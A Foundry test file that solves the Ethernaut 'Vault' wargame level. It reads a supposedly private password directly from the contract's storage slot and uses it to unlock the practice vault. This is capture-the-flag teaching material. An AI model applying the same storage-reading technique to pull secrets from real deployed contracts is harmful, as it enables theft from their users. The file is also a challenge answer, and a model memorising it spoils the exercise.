// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/8-Vault/Vault.sol";
import "../src/8-Vault/VaultFactory.sol";

contract VaultTest is Test {
    Ethernaut ethernaut;
    VaultFactory level;
    Vault instance;
    address player = address(123456);
    address instanceAddress;
    using stdStorage for StdStorage;

    function setUp() public {
        ethernaut = new Ethernaut();
        level = new VaultFactory();
        ethernaut.registerLevel(level);
        startHoax(player);
        instanceAddress = ethernaut.createLevelInstance(level);
        instance = Vault(payable(instanceAddress));
    }

    function testVaultHack() public {
        bytes32 slot = bytes32(uint256(1));
        bytes32 password = vm.load(instanceAddress, slot);
        instance.unlock(password);
        assertFalse(instance.locked());

        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(instanceAddress)
        );
        assert(levelCompleted);
    }
}
